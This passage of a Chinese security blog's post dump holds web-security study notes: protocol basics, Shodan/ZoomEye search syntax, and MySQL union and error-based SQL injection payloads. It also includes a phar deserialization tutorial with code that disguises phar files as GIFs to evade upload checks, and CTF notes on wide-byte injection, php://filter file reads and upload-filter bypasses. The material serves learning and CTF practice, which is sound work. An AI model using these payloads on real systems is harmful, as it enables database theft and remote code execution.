**了解公司最重要的资产是什么，他们最看重的数据是什么**。 \n\n **在完成资产等级划分之后，需要划分信任域和信任边界。**最简单的划分方式就是从网络逻辑上来划分。\n\n### 威胁分析\n\n**找出所有威胁**\n\n### 风险分析\n\n   ***风险由以下因素组成：***\n\n   Risk=Probability*Damage Potential\n\n   **影响风险高低的因素除了造成损失的大小之外还有考虑到发生的可能性。**\n\n### 确认解决方案\n\n **好的安全方案对用户应该是透明的，尽可能地不要改变用户的使用习惯。** \n\n\n\n***\\*最终，一个优秀的安方案应该具备以下功能：\\****\n\n-  能够有效的解决问题\n-  用户体验好\n-  高性能\n-  低耦合\n-  易于扩展与升级\n-  满足“三要素”\n\n\n\n## WEB协议\n\n### IP协议\n\nIP（Internet Protocol）协议的英文名直译就是因特网协议，IP协议是TCP/IP协议簇的核心协议，也是TCP/IP协议的载体，所有的TCP、UDP、、ICMP数据都以IP协议数据报格式传输。\n\nIP协议提供的是不可靠的、无连接的数据传送服务。\n\n**IP包头：**\n\n![img](./20200111/20180228163405303.png)\n\n### TCP协议\n\n TCP/IP(Transmission Control Protocol/InternetProtocol) 即传输控制协议/网间协议，是一个工业标准的协议集，它是为广域网（WAN）设计的。 \n\nTCP协议的首部格式\n\n ![img](./20200111/20180228163517930.png) \n\nTCP协议的特点\n\n（1）TCP 是面向连接的传输层协议\n\n（2）TCP 提供可靠交付的服务\n\n（3）TCP 提供全双工通信\n\n（4）面向字节流\n\nTCP三次握手\n\n ![img](./20200111/20180228163659575.png) \n\n步骤：\n\n（1）客户机A向服务器B发送链接请求，并且设置SYN=1，seq=x \n\n（2）服务器B收到来自客户机A的链接请求之后，向客户机发送响应，同时设置SYN=1，seq=y,ACK=1,ack=x+1\n\n（3）当客户机收到来自服务器的响应之后，会给服务器返回一个响应表示已经收到该响应（ACK=1，seq=x+1，ack=y+1）。\n\n\n### ARP协议\n\n ARP (AddressResolution Protocol) 是个地址解析协议。最直白的说法是：在IP以太网中，当一个上层协议要发包时，有了该节点的IP地址，ARP就能提供该节点的MAC地址。 \n\n### DNS协议\n\nDNS（Domain Name System）即域名系统，它主要用于实现IP地址与域名地址之间的相互转换。我们经常会在浏览器URL（统一资源定位）地址栏中输入的是一段英文字母组成的域名，而不是一段IP地址，因为IP地址的多变，又是纯数字所以容易记混，所以常常使用域名来进行查询，而DNS的主要左右就是将此时的域名转换为IP地址进行查询.\n\n### NetBIOS协议\n\n NetBIOS(网络基本输入/输出系统）最初由 IBM，Sytek 作为API开发，使用户软件能使用局域网的资源。自从诞生，Netbois成为许多其他网络应用程序的基础。严格意义上，Netbios 是接入网络服务的接口标准。  \n\n### HTTP协议\n\nHTTP协议是Hyper Text Transfer Protocol（超文本传输协议）的缩写,是用于从万维网（WWW:WorldWide Web ）服务器传输超文本到本地浏览器的传送协议。\n\nHTTP是一个基于TCP/IP通信协议来传递数据（HTML 文件, 图片文件, 查询结果等）。\n\nHTTP是一个属于应用层的面向对象的协议，由于其简捷、快速的方式，适用于分布式超媒体信息系统。它于1990年提出，经过几年的使用与发展，得到不断地完善和扩展。目前在WWW中使用的是HTTP/1.0的第六版，HTTP/1.1的规范化工作正在进行之中，而且HTTP-NG(Next Generation of HTTP)的建议已经提出。\n\nHTTP协议工作于客户端-服务端架构为上。浏览器作为HTTP客户端通过URL向HTTP服务端即WEB服务器发送所有请求。Web服务器根据接收到的请求后，向客户端发送响应信息。\n\n **HTTP请求响应模型：** \n\n ![img](./20200111/20180228170340114.png) \n\n **HTTP消息请求格式** \n\n ![img](./20200111/20180228170748406.png) \n\n ![img](./20200111/20180228171012341.png) \n\n ![img](./20200111/20180228171142973.png) \n\nHTTP的响应状态码：\n\n1XX：信息提示，表示请求已被成功接收，继续处理。其范围是100~101\n\n2XX：成功，服务器成功地处理了请求，其范围是200~206\n\n3XX：重定向，重定向状态码用于告诉浏览器客户端，它们访问的资源已经被移动，并告诉客户新的资源地址位置。\n\n4XX:客户端错误状态码，有时客户端会发送一些服务器无法处理的东西，比如格式错误的请求，或者最常见的是，请求一个不存在的URL。其范围是400~415\n\n5XX：有是有客户端发送一条有效请求，但WEB服务器自身却出错了，可能是WEB服务请运行出错了，或者网站都挂了。范围：500~505\n\n常见的状态码描述：\n\n200:客户端请求成功，是最常见的状态。\n\n302：重定向。\n\n404：请求资源不存在，是最常见的状态。\n\n400：客户端请求有语法错误，不能被服务器所理解。\n\n403：服务器收到请求，但是拒绝提供服务。\n\n500：服务器内部错误，是最常见的状态之一。\n\n503：服务器当前不能处理客户端请求，一段时间后可能恢复正常。\n\n几个重要的HTTP头部构成部分\n\n（1）Host——请求报头部内容，主要用于指定被请求资源的Internet主机和端口号，例如：Host:www.baidu.com:80\n\n（2）User-Agent——请求报头域允许客户端将他的操作系统、浏览器和其他属性告诉服务器。登录一些网站时，很多时候都可以见到显示我们的浏览器、系统信息。\n\n（3）Referer——代表当前访问的URL的上一个URL，也就是说，用户是从什么地方来到本页面的，来自哪里。\n\n（4）Cookie——Cookie是一段文本，常用来表示请求者身份等。\n\n（5）X-Forward-For———代表请求端的IP，可以有多个，中间使用“，”隔开。\n\n\n\n## 信息收集\n\n### Google Hacking\n\n部分语法百度试用\n\n- Site       指定域名 \n- Intext     正文中存在关键字的网页\n- Intitle     标题中存在关键字的网页\n- Info       一些基本信息\n- Inurl      URL存在关键字的网页\n- Filetype   搜索指定文件类型\t\n\n**双引号: 代表完全匹配搜索**\n\n**减号:  代表搜索不包含减号后面的词的页面**\n\n**星号: 代表通配符**\n\n\n\n### ZoomEye\n\n **ZoomEye**是一款针对网络空间的搜索引擎，收录了互联网空间中的设备、网站及其使用的服务或组件等信息。 \n\n**指定搜索的组件**：\n\napp：组件名称\n\nvar：组件版本\n\n例如：搜索 apache组件    版本2.4\n\napp:apache var:2.4\n\n**指定搜素的端口**\n\nport:端口号\n\n例如：搜索开放了SSH端口的主机\n\nport:22\n一些服务器可能监听了非标准的端口。要按照更精确的协议进行检索，可以使用service进行过滤。\n\n**指定搜索的操作系统：**\n\nOS:操作系统\n\n例如：搜索Linux操作系统\n\nOS:Linux\n\n**指定搜索的服务：**\n\nservice：服务名称\n\n例如，搜索SSH服务\n\nservice：SSH\n\n**指定搜索的地理位置范围：**\n\ncountry：国家名\n\ncity:城市名\n\n例如：\n\ncountry:China\n\ncity：Beijing\n\n**指定搜索的CIDR网段：**\n\ncidr:网段\n\n例如：\n\nCIDR：192.168.158.12/24\n\n**指定网站域名进行搜索：**\n\nSite:网站域名\n\n例如：\n\nsite:www.baidu.com\n\n**指定主机名：**\n\nHostname:主机名\n\n例如：\n\nhostname:zwl.cuit.edu.cn\n\n**指定设备名：**\n\ndevice:设备名\n\n例如：\n\ndevice:router\n\n**指定首页关键词：**\n\nkeyword:关键词\n\n例如：\n\nkeyword:technology\n\n\n### Shodan\n\n Shodan是一个搜素互联网链接设备的搜索引擎，不同于Google、Baidu这些搜素引擎。用户可以在Shodan上使用Shodan搜索语法查找链接到互联网的摄像头、路由器、服务器等设备信息。在渗透测试中是个非常非常不错的神器。 \n\n```java\nhostname——————————搜索指定的主机或域名，例如 hostname:baidu\nport——————————————搜索指定的端口或服务，例如 port:80\ncountry———————————搜索指定的国家，例如 country:US\ncity——————————————搜索指定的城市，例如 city:Chengdu\norg———————————————搜索指定的组织或公司，例如 org:\"Google\"\nisp———————————————搜索指定的ISP供应商，例如 isp:\"China Telecom\"\nproduct———————————搜索指定的操作系统/软件/平台，例如 product:\"Apache httpd\"\nversion———————————搜索指定的软件版本，例如 version:\"1.6.2\"\ngeo———————————————搜索指定的地理位置，参数为经纬度，例如 geo:\"31.8639, 117.2808\"\nbefore/after——————搜索指定收录时间前后的数据，格式为dd-mm-yy，例如 before:\"11-11-15\"\nnet———————————————搜索指定的IP地址或子网，例如 net:\"210.45.240.0/24\"\n```\n\n例子:  Server: uc-httpd 1.0.0 200 OK Country:\"CN\" \n\n### 站长之家\n\n\n\n## MYSQL注入\n\n###  **爆字段** \n\n   order by 猜测的字段数 \n\n###  **匹配字段** \n\n and 1=1 union select 1,2,3,......,n \n\n###  **获取显示字段** \n\n and 1=2 union select 1,2,3,4......n \n\n###  **利用内置函数爆数据库信息** \n\n version() database() user() \n\n###  **操作系统信息** \n\n and  1=2 union  all select  @@global.version_compile_os from  mysql.user \n\n###  **暴库（mysql>5.0）** \n\n and 1=2 union selec 1,2,3,SCHEMA_NAME,5,6,7,8,9,10  from  information_schema.SCHEMA limit 0,1 \n\n###  **猜表** \n\nand  1=2 union select 1,2,3,TABLE_NAME,5,6,7,8,9,10 from information_schema.TABLES where TABLE_SCHEMA=数据库（十六进制） limit 0（开始的记录，0为第一个开始记录），1（显示1条记录）\n\n\n###  **爆字段** \n\n and 1=2 union select 1,2,3,COLUMN_NAME,5,6,7,8,9,10 from information_schemation.COLUMNS where TABLE_NAMEE=表名（十六进制） limit 0 ,1 \n\n###  **爆密码** \n\n and 1=2 union select 1,2,3,用户名段，5,6,7,8,9 from 表名 limit 0,1 \n\n### floor()报错注入\n\n **floor()报错注入准确地说应该是floor,count,group by冲突报错** \n\n```SQL\nselect count(*) ,concat(database(),floor(rand(0)*2))x from users group by x\n```\n\n","tags":["笔记"],"categories":["笔记"]},{"title":"phar反序列化漏洞利用","url":"%2F2019%2F09%2F22%2Fphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%2F","content":"\n# 概述\n \n Phar反序列化漏洞是一种较新的攻击向量，用于针对面向对象的PHP应用程序执行代码重用攻击，该攻击方式在Black Hat 2018会议上由安全研究员Sam Thomas公开披露。类似于对编译二进制文件的ROP（Return-oriented Programming）攻击，这种类型的漏洞利用PHP对象注入（POI），这是面向对象的PHP代码上下文中的一种面向属性的编程（POP）。\n\n 利用phar文件会以序列化的形式存储用户自定义的meta-data这一特性，拓展了php反序列化漏洞的攻击面。该方法在文件系统函数（file_exists()、is_dir()等）参数可控的情况下，配合phar://伪协议，可以不依赖unserialize()直接进行反序列化操作。这让一些看起来“人畜无害”的函数变得“暗藏杀机”，下面我们就来了解一下这种攻击手法。\n\n# 什么是Phar文件？\nphar (PHP Archive) 是PHP里类似于Java中jar的一种打包文件，用于归档。当PHP 版本>=5.3时默认开启支持PHAR文件的。\n\nphar文件默认状态是只读，使用phar文件不需要任何的配置。\n\n而phar://伪协议即PHP归档，用来解析phar文件内容。\n\n**通过查阅手册可知一个phar文件有四部分构成：**\n## 1. stub\n一个供phar扩展用于识别的标志，格式为xxx<?php xxx; __HALT_COMPILER();?>，前面内容不限，但必须以__HALT_COMPILER();?>来结尾，否则phar扩展将无法识别这个文件为phar文件。\n\n## 2. manifest\nphar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。\n\n![manifest]( phar反序列化漏洞利用/1.png)\n\n## 3. contents\n被压缩文件的内容。\n\n## 4. signature\n签名，放在文件末尾，格式如下：\n\n![signature]( phar反序列化漏洞利用/2.png)\n\n# phar 使用实例\n**注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件**\n![关闭readonly]( phar反序列化漏洞利用/3.png)\n\n**index.php**\n``` PHP\n<?php\n    class Test {\n\t\tvar $test;\n\t\tfunction __destruct(){\n            echo \"hello\";\n        }\n    }\n\n    @unlink(\"phar.phar\");\n    $phar = new Phar(\"phar.phar\"); //后缀名必须为phar\n    $phar->startBuffering();\n    $phar->setStub(\"<?php __HALT_COMPILER(); ?>\"); //设置stub\n    $o = new Test();\n    $phar->setMetadata($o); //将自定义的meta-data存入manifest\n    $phar->addFromString(\"test.txt\", \"test\"); //添加要压缩的文件\n    //签名自动计算\n    $phar->stopBuffering();\n?>\n```\n用winhax 打开可以看到phar文件里已经包含了我们要反序列化的内容\n![phar文件]( phar反序列化漏洞利用/4.png)\n\n有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：\n![序列化]( phar反序列化漏洞利用/5.png)\n\n\n测试phar反序列化漏洞\n**parse.php**\n``` PHP\n    class Test {\n\t\tvar $test;\n\t\tfunction __destruct(){\n            echo \"hello\";\n        }\n    }\n/*\n    @unlink(\"phar.phar\");\n    $phar = new Phar(\"phar.phar\"); //后缀名必须为phar\n    $phar->startBuffering();\n    $phar->setStub(\"<?php __HALT_COMPILER(); ?>\"); //设置stub\n    $o = new Test();\n    $phar->setMetadata($o); //将自定义的meta-data存入manifest\n    $phar->addFromString(\"test.txt\", \"test\"); //添加要压缩的文件\n    //签名自动计算\n    $phar->stopBuffering();\n*/\n    $filename = 'phar://phar.phar';\n    file_exists($filename);\n```\n![漏洞利用]( phar反序列化漏洞利用/6.png)\n\n# 将phar伪造成其他格式的文件\nphp识别phar文件是通过其文件头的stub，即识别**__HALT_COMPILER();?>**这段代码，对前面的内容是没有要求的，我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。\n``` PHP\n<?php\n    class Test {\n\t\tvar $test;\n\t\tfunction __destruct(){\n            echo \"hello\";\n        }\n    }\n\n    @unlink(\"phar.phar\");\n    $phar = new Phar(\"phar.phar\");\n    $phar->startBuffering();\n    $phar->setStub(\"GIF89a\".\"<?php __HALT_COMPILER(); ?>\"); //设置stub，增加gif文件头\n    $o = new TestObject();\n    $phar->setMetadata($o); //将自定义meta-data存入manifest\n    $phar->addFromString(\"test.txt\", \"test\"); //添加要压缩的文件\n    //签名自动计算\n    $phar->stopBuffering();\n?>\n```\n运行代码，生成phar.phar 文件，我们可以修改为任意后缀，例如gif，文件头部特征可以任意修改，但是**__HALT_COMPILER(); ?> **这里不能变\n\n采用这种方法可以绕过很大一部分上传检测。\n\n# 漏洞利用条件\n>* 能上传文件道服务器\n>* 有可以利用魔术方法的\"跳板\",在本文中指的是\n```\nfunction __destruct(){\n    echo \"hello\";\n}\n```\n>* 文件操作函数的参数可控，且:、/、phar等特殊字符未被过滤\n\n# 漏洞底层源码\n在php-src/ext/phar/phar.c中可以查看到phar在解析metadata时会调用php_var_unserialize()函数来对metadata进行反序列化操作：\n![底层]( phar反序列化漏洞利用/7.png)\n\n# 防御\n>* 在文件系统函数的参数可控时，对参数进行严格的过滤；\n\n>* 严格检查上传文件的内容，而不是只检查文件头；\n\n>* 在条件允许的情况下禁用可执行系统命令、代码的危险函数；","tags":["CTF"]},{"title":"CTF 笔记","url":"%2F2019%2F04%2F26%2FSQL%E6%B3%A8%E5%85%A5%2F","content":"# SQL 中报错情况(可用于报错注入)\n> * 测试 payload 如下:\nusername = admin’ union select cot(1 and left(database(),1)>’a’);#\n> cot(0) 报错\n\n> * pow()函数报错\n>  pow(1,22222222)=1  ,pow(0,22222222) 会报错","tags":["SQL"]},{"title":"win10 右键打开CMD","url":"%2F2018%2F12%2F01%2Fwin10-%E5%8F%B3%E9%94%AE%E6%89%93%E5%BC%80CMD%2F","content":"\n#实现win10 右键出现cmd菜单\n![win10 右键打开CMD](win10-右键打开CMD/1.png)\n\n#### **新建一个txt文件**\n#### 输入代码如下：\n```\nWindows Registry Editor Version 5.00\n\n[HKEY_CLASSES_ROOT\\Directory\\shell\\OpenCmdHere]\n@=\"CMD\"\n\"Icon\"=\"cmd.exe\"\n\n[HKEY_CLASSES_ROOT\\Directory\\shell\\OpenCmdHere\\command]\n@=\"PowerShell -windowstyle hidden -Command \\\"Start-Process cmd.exe -ArgumentList '/s,/k, pushd,%V' -Verb RunAs\\\"\"\n\n[HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\OpenCmdHere]\n@=\"CMD\"\n\"Icon\"=\"cmd.exe\"\n\n[HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\OpenCmdHere\\command]\n@=\"PowerShell -windowstyle hidden -Command \\\"Start-Process cmd.exe -ArgumentList '/s,/k, pushd,%V' -Verb RunAs\\\"\"\n\n[HKEY_CLASSES_ROOT\\Drive\\shell\\OpenCmdHere]\n@=\"CMD\"\n\"Icon\"=\"cmd.exe\"\n\n[HKEY_CLASSES_ROOT\\Drive\\shell\\OpenCmdHere\\command]\n@=\"PowerShell -windowstyle hidden -Command \\\"Start-Process cmd.exe -ArgumentList '/s,/k, pushd,%V' -Verb RunAs\\\"\"\n\n[HKEY_CLASSES_ROOT\\LibraryFolder\\background\\shell\\OpenCmdHere]\n@=\"CMD\"\n\"Icon\"=\"cmd.exe\"\n\n[HKEY_CLASSES_ROOT\\LibraryFolder\\background\\shell\\OpenCmdHere\\command]\n@=\"PowerShell -windowstyle hidden -Command \\\"Start-Process cmd.exe -ArgumentList '/s,/k, pushd,%V' -Verb RunAs\\\"\"\n```\n\n#### 保存修改文件后缀为 **.reg**\n运行即可","tags":["扩展"]},{"title":"CTF 笔记","url":"%2F2018%2F11%2F27%2FCTF-%E7%AC%94%E8%AE%B0%2F","content":"# WEB 题 笔记\n\n> * PHP chr() 函数\n> chr() 函数从指定 ASCII 值返回字符。\n\n> * base64_decode函数\n> base64_decode — 对使用 MIME base64 编码的数据进行解码\n对 base64 编码的 data 进行解码。\n\n> * base64_encode加密函数\n\n> * 如果是walf严格匹配，通过修改Content-type后字母的大小写可以绕过检测，使得需要上传的文件可以到达服务器端，而服务器的容错率较高，一般我们上传的文件可以解析。然后就需要确定我们如何上传文件，在分别将后缀名修改为php2, php3, php4, php5, phps, pht, phtm, phtml       ----------  Content-Type: MUltipart/form-data 进行大小写绕过....\n\n> * eregi有%00截断的漏洞\n> \n> * PHP ord() 函数\n> ord() 函数返回字符串的首个字符的 ASCII 值。\n\n> * PHP eval() 函数\n> eval() 函数把字符串按照 PHP 代码来计算。\n该字符串必须是合法的 PHP 代码，且必须以分号结尾。\n如果没有在代码字符串中调用 return 语句，则返回 NULL。如果代码中存在解析错误，则 eval() 函数返回 false。\n\n> * PHP文件备份名后缀pak\n\n> * SQL regexp 正则表达式\n\n> * UpdateXml() MYSQL显错注入\n在学习之前,需要先了解 UpdateXml() 。\nUPDATEXML (XML_document, XPath_string, new_value); \n第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc \n第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。 \n第三个参数：new_value，String格式，替换查找到的符合条件的数据 \n因为UPDATEXML第二个参数需要Xpath格式的字符串,所以不符合要求，然后报错:\n```\nusername=' or updatexml/*&password=1*/(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema regexp database()),0x7e),1) or ' \nusername=' or updatexml/*&password=1*/(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema regexp database() and table_name regexp 0x66666c6c34346a6a),0x7e),1) or ' \nusername=' or updatexml/*&password=1*/(1,concat(0x7e,(select value from ffll44jj),0x7e),1) or ' \n```\n> * PHP implode() 函数\n> implode() 函数返回一个由数组元素组合成的字符串。\n\n> * PHP mysqli_num_rows() 函数\n> 返回结果集中行的数量：\n\n> * PHP openssl_decrypt\n> openssl_decrypt - 解密数据\n> 采用raw或base64编码的字符串，并使用给定的方法和密钥对其进行解密。\n\n> * PHP之filter协议\n> php:// — 访问各个输入/输出流（I/O streams）\nphp://input 是个可以访问请求的原始数据的只读流。\nphp://filter 是一种设计用来允许过滤器程序在打开时成为流的封装协议。这对于单独具有完整功能的文件函数非常有用，否则就没有机会在读取内容之前将过滤器应用于流之上。\n该协议语法为：php://filter:/<action>=<name>\n\n>例题：南邮ctf 文件包含http://4.chinalover.sinaapp.com/web7/index.php \n点击题目所给链接url：http://4.chinalover.sinaapp.com/web7/index.php?file=show.php\n为典型的文件包含漏洞。我们可以通过构造含有漏洞的语句，查看想要看的代码： file=php://filter/convert.base64-encode/resource=index.php 。再将得到的base64码解码即可。\n\n> * PHP intval() 函数\n> intval() 函数用于获取变量的整数值。\nintval() 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。\n\n> * PHP 函数 ereg()\n> ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。ereg会把null视为字符串的结束，从而被%00截断\n\n> * PHP strpos() 函数\n> strpos() 函数查找字符串在另一字符串中第一次出现的位置。strpos则可以越过%00\n\n\n> * sql: GROUP BY key2 WITH ROLLUP  查不到返回NULL\n\n\n> * %df'宽字节注入 id=1%df'\n> 宽字符: \n（1）%27 '\n（2）%20 空格\n（3）%23 #\n（4）%df 運（说明,也可以是其他的%d1之类，解析之后变成中文字符）\n>这个PHP程序的SQL注入POC为：\nhttp://127.0.0.1/test/t3.php?name=a%df' or 1=1; %20%23\n其原理是mysql_query(\"SETNAMES 'gbk'\",$conn)语句将编码字符集修改为gbk，此时，%df\\'对应的编码就是%df%5c’，即汉字“運’”，这样单引号之前的转义符号“\\”就被吃调了，从而转义消毒失败。\n\n> * SQL ORDER BY 子句\n> ORDER BY 语句用于根据指定的列对结果集进行排序。\n\n> * DATABASE() 返回当前数据库名\n\n> * 获取数据库表名，id=1%df' and 1=2 union select 1,group_concat(table_name) from information_schema.TABLES where table_schema=database() %23\n\n> * concat()函数\n> 将多个字符串连接成一个字符串。\n\n\n\n> * PHP move_uploaded_file() 函数\n> move_uploaded_file() 函数将上传的文件移动到新位置。\n\n\n> * escapeshellarg() — 把字符串转码为可以在 shell 命令里使用的参数\n> escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符 。\n\n\n> * MySQL information_schema\n```\nnformation_schema数据库是MySQL系统自带的数据库，它提供了数据库元数据的访问方式。感觉information_schema就像是MySQL实例的一个百科全书，记录了数据库当中大部分我们需要了结的信息，比如字符集，权限相关，数据库实体对象信息，外检约束，分区，压缩表，表信息，索引信息，参数，优化，锁和事物等等。通过information_schema我们可以窥透整个MySQL实例的运行情况，可以了结MySQL实例的基本信息，甚至优化调优，维护数据库等，可以说是真正的一部百科全书啊哈哈。\n下面就是根据自己学习的一些小小经验将这些表进行一个大体的分类，方便大家了结，要是有不足的地方请指出，我会尽快修改。\n1：关于字符集和排序规则相关的系统表\nCHARACTER_SETS ：存储数据库相关字符集信息（memory存储引擎）\nCOLLATIONS ：字符集对应的排序规则\nCOLLATION_CHARACTER_SET_APPLICABILITY：就是一个字符集和连线校对的一个对应关系而已\n下面我们说一下character sets和collations的区别：\n字符集（character sets）存储字符串，是指人类语言中最小的表义符号。例如’A'、’B'等；\n排序规则（collations）规则比较字符串，collations是指在同一字符集内字符之间的比较规则\n每个字符序唯一对应一种字符集，但一个字符集可以对应多种字符序，其中有一个是默认字符序(Default Collation)\n MySQL中的字符序名称遵从命名惯例：以字符序对应的字符集名称开头；以_ci(表示大小写不敏感)、_cs(表示大小写敏感)或_bin(表示按编码值比较)结尾。例如：在字符序“utf8_general_ci”下，字符“a”和“A”是等价的\n看一下有关于字符集和校对相关的MySQL变量：\ncharacter_set_server：默认的内部操作字符集\ncharacter_set_client：客户端来源数据使用的字符集\ncharacter_set_connection：连接层字符集\ncharacter_set_results：查询结果字符集\ncharacter_set_database：当前选中数据库的默认字符集\ncharacter_set_system：系统元数据(字段名等)字符集\n再看一下MySQL中的字符集转换过程：\n（1）. MySQL Server收到请求时将请求数据从character_set_client转换为character_set_connection；\n（2）. 进行内部操作前将请求数据从character_set_connection转换为内部操作字符集，其确定方法如下：\n使用每个数据字段的CHARACTER SET设定值；\n若上述值不存在，则使用对应数据表的DEFAULT CHARACTER SET设定值(MySQL扩展，非SQL标准)；\n若上述值不存在，则使用对应数据库的DEFAULT CHARACTER SET设定值；\n若上述值不存在，则使用character_set_server设定值。\n（3）. 将操作结果从内部操作字符集转换为character_set_results。\n2：权限相关的一些表：\nSCHEMA_PRIVILEGES：提供了数据库的相关权限，这个表是内存表是从mysql.db中拉去出来的。\nTABLE_PRIVILEGES:提供的是表权限相关信息，信息是从 mysql.tables_priv 表中加载的\nCOLUMN_PRIVILEGES ：这个表可以清楚就能看到表授权的用户的对象，那张表那个库以及授予的是什么权限，如果授权的时候加上with grant option的话，我们可以看得到PRIVILEGE_TYPE这个值必须是YES。\nUSER_PRIVILEGES:提供的是表权限相关信息，信息是从 mysql.user 表中加载的\n通过表我们可以很清晰看得到MySQL授权的层次，SCHEMA，TABLE，COLUMN级别，当然这些都是基于用户来授予的。可以看得到MySQL的授权也是相当的细密的，可以具体到列，这在某一些应用场景下还是很有用的，比如审计等。\n3：存储数据库系统的实体对象的一些表：\nCOLUMNS：存储表的字段信息，所有的存储引擎\nINNODB_SYS_COLUMNS ：存放的是INNODB的元数据， 他是依赖于SYS_COLUMNS这个统计表而存在的。\nENGINES ：引擎类型，是否支持这个引擎，描述，是否支持事物，是否支持分布式事务，是否能够支持事物的回滚点\nEVENTS ：记录MySQL中的事件，类似于定时作业\nFILES ：这张表提供了有关在MySQL的表空间中的数据存储的文件的信息，文件存储的位置，这个表的数据是从InnoDB in-memory中拉取出来的，所以说这张表本身也是一个内存表，每次重启重新进行拉取。也就是我们下面要说的INNODB_SYS_DATAFILES这张表。还要注意一点的是这张表包含有临时表的信息，所以说和SYS_DATAFILES 这张表是不能够对等的，还是要从INNODB_SYS_DATAFILES看。如果undo表空间也配置是InnoDB 的话，那么也是会被记录下来的。\nPARAMETERS ：参数表存储了一些存储过程和方法的参数，以及存储过程的返回值信息。存储和方法在ROUTINES里面存储。\nPLUGINS ：基本上是MySQL的插件信息，是否是活动状态等信息。其实SHOW PLUGINS本身就是通过这张表来拉取道德数据\nROUTINES：关于存储过程和方法function的一些信息，不过这个信息是不包括用户自定义的，只是系统的一些信息。\nSCHEMATA：这个表提供了实例下有多少个数据库，而且还有数据库默认的字符集\nTRIGGERS :这个表记录的就是触发器的信息，包括所有的相关的信息。系统的和自己用户创建的触发器。\nVIEWS :视图的信息，也是系统的和用户的基本视图信息。\n这些表存储的都是一些数据库的实体对象，方便我们进行查询和管理，对于一个DBA来说，这些表能够大大方便我们的工作，更快更方便的了结和查询数据库的相关信息。\n4：约束外键等相关的一些表：\nREFERENTIAL_CONSTRAINTS：这个表提供的外键相关的信息，而且只提供外键相关信息\nTABLE_CONSTRAINTS ：这个表提供的是 相关的约束信息\nINNODB_SYS_FOREIGN_COLS ：这个表也是存储的INNODB关于外键的元数据信息和SYS_FOREIGN_COLS 存储的信息是一致的\nINNODB_SYS_FOREIGN ：存储的INNODB关于外键的元数据信息和SYS_FOREIGN_COLS 存储的信息是一致的，只不过是单独对于INNODB来说的\nKEY_COLUMN_USAGE：数据库中所有有约束的列都会存下下来，也会记录下约束的名字和类别\n为什么要把外键和约束单列出来呢，因为感觉这是一块独立的东西，虽然我们的生产环境大部分都不会使用外键，因为这会降低性能，但是合理的利用约束还是一个不错的选择，比如唯一约束。\n5：关于管理的一些的一些表：\nGLOBAL_STATUS ，GLOBAL_VARIABLES，SESSION_STATUS，SESSION_VARIABLES：这四张表分别记录了系统的变量，状态（全局和会话的信息），作为DBA相信大家也都比较熟悉了，而且这几张表也是在系统重启的时候回重新加载的。也就是内存表。\nPARTITIONS ：MySQL分区表相关的信息，通过这张表我们可以查询到分区的相关信息（数据库中已分区的表，以及分区表的分区和每个分区的数据信息），分区相关详细信息参见MySQL分区管理\nPROCESSLIST：show processlist其实就是从这个表拉取数据，PROCESSLIST的数据是他的基础。由于是一个内存表，所以我们相当于在内存中查询一样，这些操作都是很快的。\nINNODB_CMP_PER_INDEX，INNODB_CMP_PER_INDEX_RESET：这两个表存储的是关于压缩INNODB信息表的时候的相关信息,有关整个表和索引信息都有.我们知道对于一个INNODB压缩表来说,不管是数据还是二级索引都是会被压缩的,因为数据本身也可以看作是一个聚集索引。关于压缩表在information_schema系列十一有些许简单的介绍。\nINNODB_CMPMEM ，INNODB_CMPMEM_RESET：这两个表是存放关于MySQL INNODB的压缩页的buffer pool信息，但是要注意一点的就是,用这两个表来收集所有信息的表的时候,是会对性能造成严重的影响的,所以说默认是关闭状态的。如果要打开这个功能的话我们要设置innodb_cmp_per_index_enabled参数为ON状态。\nINNODB_BUFFER_POOL_STATS ：表提供有关INNODB 的buffer pool相关信息，和show engine innodb status提供的信息是相同的。也是show engine innodb status的信息来源。\nINNODB_BUFFER_PAGE_LRU，INNODB_BUFFER_PAGE :维护了INNODB LRU LIST的相关信息，详细请见小编笔记innodb buffer pool小解\nINNODB_BUFFER_PAGE ：这个表就比较屌了，存的是buffer里面缓冲的页数据。查询这个表会对性能产生很严重的影响，千万不要再我们自己的生产库上面执行这个语句，除非你能接受服务短暂的停顿，详细请见小编笔记innodb buffer pool小解\nINNODB_SYS_DATAFILES ：这张表就是记录的表的文件存储的位置和表空间的一个对应关系(INNODB)\nINNODB_TEMP_TABLE_INFO ：这个表惠记录所有的INNODB的所有用户使用到的信息，但是只能记录在内存中和没有持久化的信息。\nINNODB_METRICS ：提供INNODB的各种的性能指数，是对INFORMATION_SCHEMA的补充，收集的是MySQL的系统统计信息。这些统计信息都是可以手动配置打开还是关闭的。有以下参数都是可以控制的：innodb_monitor_enable, innodb_monitor_disable, innodb_monitor_reset, innodb_monitor_reset_all。\nINNODB_SYS_VIRTUAL :表存储的是INNODB表的虚拟列的信息，当然这个还是比较简单的，在MySQL 5.7中，支持两种Generated Column，即Virtual Generated Column和Stored Generated Column，前者只将Generated Column保存在数据字典中（表的元数据），并不会将这一列数据持久化到磁盘上；后者会将Generated Column持久化到磁盘上，而不是每次读取的时候计算所得。很明显，后者存放了可以通过已有数据计算而得的数据，需要更多的磁盘空间，与实际存储一列数据相比并没有优势，因此，MySQL 5.7中，不指定Generated 